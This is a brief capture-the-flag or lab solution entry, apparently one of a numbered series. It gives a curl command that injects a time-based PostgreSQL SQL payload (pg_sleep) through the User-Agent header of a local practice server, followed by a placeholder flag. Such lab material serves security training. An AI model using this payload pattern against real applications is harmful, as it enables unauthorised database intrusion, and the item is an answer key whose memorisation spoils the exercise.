# SQLi-034: PostgreSQL Time-based via User-Agent

Injection Point: `User-Agent` HTTP header

```bash
curl -A "Mozilla'; SELECT CASE WHEN 1=1 THEN pg_sleep(2) END--" http://localhost:5034/
```

## 🏁 Flag: `FLAG{...}`
